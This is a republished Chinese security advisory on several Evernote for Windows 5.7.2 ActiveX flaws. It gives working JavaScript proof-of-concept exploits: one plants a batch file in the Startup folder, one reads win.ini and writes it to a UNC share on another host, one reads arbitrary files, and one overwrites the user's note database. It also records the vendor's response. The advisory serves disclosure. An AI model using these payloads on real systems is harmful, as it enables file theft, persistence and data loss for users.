SSD公告:印象笔记Evernote多个安全漏洞

2015-07-13 10:06:16 阅读：8275次 点赞(0) 收藏 来源： 安全客

引言

Evernote这款产品可以让你随时随地做笔记，并且可以将文件同步到您的移动设备中，可以存储网页，捕捉灵感，并和朋友分享你的想法。

在Windows平台的Evernote中，已经发现了多个安全漏洞，这些漏洞可能会导致执行远程代码。

Evernote产品安装了一个ActiveX控件，设置如下：

CLSID: {92EF2EAD-A7CE-4424-B0DB-499CF856608E}
ProgID: EvernoteIE.Addin.2
Binary Path: C:\Program Files\Evernote\Evernote\EvernoteIE.dll
Safe For Initialization (Registry): True
Safe For Scripting (Registry): True

在Windows注册表中，这控件被标记为“脚本安全”和“安全地初始化”。鉴于此，IE浏览器将允许根据客户浏览器的安全设置而进行对自身属性和方法的设置。

如果在安装了该产品的情况下启动IE浏览器，那么浏览器就会询问“是否启用该插件”，然而，为了最大程度地提高应用程序的使用效率，用户极有可能会选择启用所有功能。鉴于此，上述漏洞将便会被触发，而且无需与用户进行交互。

安全漏洞

它提供了各种不安全的方法，见类库：

[1] writeFileContent

该writeFileContent()方法允许在任意位置存储任意文件。如果用户有足够权限，那么它将会自动启用目录内的“可写入”权限，示例代码：

< script > // <![CDATA[
var obj = new ActiveXObject("EvernoteIE.Addin.2");
var cmd = unescape("%u4143%u434c"); //CALC //Windows Vista, Windows 2k8, Windows 7 var path = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sh.bat";  try { obj.WriteFileContent(path,cmd);  } catch(e){ } //Windows XP var path = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\sh.bat";  try { obj.WriteFileContent(path,cmd);  } catch(e){ }
// ]]></script>

calc.exe将会在计算机下一次启动的时候运行。

[2] ReadFileContent

这个 ReadFileContent()方法可用于在目标机器上读取任意文件,示例代码:

<script>// <![CDATA[
var obj = new ActiveXObject("EvernoteIE.Addin.2"); try { var x = obj.ReadFileContent("C:\\WINDOWS\\win.ini");  } catch(e){ } try { obj.WriteFileContent("\\\\192.168.1.109\\uncshare\\win.ini",x); //change the path to the unc share } catch(e){ }
// ]]></script>

它将文件内容存储进了一个变量，然后这个文件可以通过WriteFileContent()进行共享。

[3] LoadFile

同样，LoadFile()方法可被滥用于从目标机器上读取任意文件，示例代码：

<script>// <![CDATA[
var obj = new ActiveXObject("EvernoteIE.Addin.2");
var x = obj.LoadFile("..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini");
document.write("
<pre> " + x + "</pre>
");
// ]]></script>

这会将win.ini的内容存储到一个变量中，然后通过JavaScript发送至远程web服务器。

[4] GetLastLoginUser 和 WriteFileContent

可通过GetLastLoginUser 和 WriteFileContent拒绝服务，这将导致用户数据库文件被重写，如果文件没有被使用，那么所有笔记都将丢失。

< script > // <![CDATA[
var obj = new ActiveXObject("EvernoteIE.Addin.2");
var x = obj.GetLastLoginUser();
document.write("
<pre> " + x + "</pre>
");
//modify the path, including the Windows username
try {
  obj.WriteFileContent("..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\[Windows username]\\AppData\\Local\\Evernote\\Evernote\\Databases\\" + x + ".exb", "aaaa");
} catch(e) {}
//otherwise try Administrator
try {
  obj.WriteFileContent("..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\Administrator\\AppData\\Local\\Evernote\\Evernote\\Databases\\" + x + ".exb", "aaaa");
} catch(e) {}
// ]]></script>

唯一的局限性就是Windows7(或更新版本)如果启用了UAC，那么就可以防止写文件，但是可以通过读取特定的包含身份验证凭证的配置文件进行远程代码执行。

易受攻击的版本

Evernote for Windows 5.7.2

补充

我们试图在2015年3月上报这些漏洞，但是没有收到任何回应，直到7月的一条微博留言称，我们提交的两个信息得到了响应。

供应商响应

“我们已经将这些发现交给了另一研究人员，并且相信这两个漏洞能够在Evernote 5.8版本中被解决。我们在2014年11月经过KrCERT收到了来自“In-Gyu，Tae”的第一份报告，他们声称自从2014年8月他们就没有收到US-CERT的任何答复。我们当时也没有做发行记录。我不好意思说，当时In-Gyu,Tae确认的那些问题都被我们藏了起来，而且当时也没有做任何记录，对此我已经改正。”
